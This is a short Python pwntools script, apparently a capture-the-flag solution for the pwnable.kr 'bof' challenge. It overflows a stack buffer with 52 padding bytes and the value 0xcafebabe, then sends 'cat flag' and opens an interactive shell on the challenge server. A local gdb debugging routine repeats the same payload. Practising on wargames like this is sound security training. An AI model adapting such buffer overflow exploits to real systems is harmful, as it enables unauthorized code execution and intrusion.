#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-04-07 21:41:37
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p32, p64

context.arch = "i386"

filename = "./bof"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    remote_process = remote("pwnable.kr", 9000)
    trash = cyclic(52)
    overwrite = p32(0xcafebabe)
    payload = trash + overwrite
    remote_process.sendline(payload)
    remote_process.sendline(b"cat flag")
    print(remote_process.recvline())
    remote_process.interactive()


def solve():
    pass


def debug():
    gdbscript = """
    break func
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    target_process.recvline()
    trash = cyclic(52)
    overwrite = p32(0xcafebabe)
    payload = trash + overwrite
    target_process.sendline(payload)
    target_process.interactive()


if __name__ == "__main__":
    # debug()
    exploit()
    # solve()

